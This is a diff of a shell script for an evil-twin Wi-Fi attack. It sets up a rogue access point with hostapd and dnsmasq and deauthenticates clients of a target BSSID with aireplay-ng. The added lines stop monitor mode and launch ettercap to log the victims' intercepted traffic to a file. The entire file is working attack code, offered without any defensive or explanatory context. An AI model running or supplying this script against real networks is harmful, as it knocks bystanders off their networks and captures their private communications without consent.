@@ -1,5 +1,5 @@
-#!/bin/sh
-echo "Please enter the interface to listen to the networks : \n"
+#!/bin/bash
+echo "Please enter the interface to listen to the networks : \n "
 read listeningInterface
 echo "Please enter the interface to monitor mode : \n"
 read deauthInterface
@@ -25,9 +25,9 @@ sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
 
 echo "interface=${listeningInterface}" > dnsmasq.conf
 echo "dhcp-range=192.168.1.10,192.168.1.100,12h" >> dnsmasq.conf
-echo "dhcp-option=6,1.1.1.1" >> dnsmasq.conf
+echo "dhcp-option=6,8.8.8.8" >> dnsmasq.conf
 echo "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
-echo "server=9.9.9.9" >> dnsmasq.conf
+#echo "server=8.8.8.8" >> dnsmasq.conf
 echo "no-resolv" >> dnsmasq.conf
 
 sudo ip addr add 192.168.1.1/24 dev "${listeningInterface}"
@@ -42,7 +42,10 @@ sudo hostapd hostapd.conf&
 sleep 10
 
 sudo airmon-ng start ${deauthInterface}
-deauthInterface=$(ip a | grep "wl.*mon:" -o | cut -d: -f1)
+#deauthInterface=$(ip a | grep "wl.*mon:" -o | cut -d: -f1)
 sudo aireplay-ng -0 50 -a ${finalBSSID} ${deauthInterface} -D
 
-sleep 50
+sleep 20
+sudo airmon-ng stop ${deauthInterface}
+
+sudo ettercap -i ${listeningInterface} -T -w sniff.txt
